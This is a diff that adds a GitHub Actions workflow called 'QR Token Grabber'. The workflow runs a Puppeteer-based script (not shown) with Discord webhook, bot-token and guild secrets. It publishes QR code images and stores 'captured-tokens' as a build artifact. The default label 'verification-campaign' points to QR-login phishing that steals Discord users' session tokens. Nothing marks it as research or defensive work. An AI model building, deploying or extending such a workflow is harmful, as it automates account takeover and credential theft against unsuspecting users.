@@ -1,0 +1,48 @@
+name: QR Token Grabber
+
+on:
+  workflow_dispatch:
+    inputs:
+      description:
+        description: 'Session label (optional)'
+        required: false
+        default: 'verification-campaign'
+
+jobs:
+  generate-qr:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      
+      - name: Install dependencies
+        run: |
+          npm install
+          npx puppeteer browsers install chrome
+      
+      - name: Run QR Grabber
+        env:
+          WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+          BOT_TOKEN: ${{ secrets.DISCORD_BOT_TOKEN }}
+          GUILD_ID: ${{ secrets.GUILD_ID }}
+        run: node src/grabber.js
+        timeout-minutes: 5
+      
+      - name: Upload QR Image
+        uses: actions/upload-artifact@v4
+        with:
+          name: qr-code
+          path: output/*.png
+          retention-days: 1
+      
+      - name: Upload Tokens (if captured)
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: captured-tokens
+          path: output/tokens.txt
+          retention-days: 7
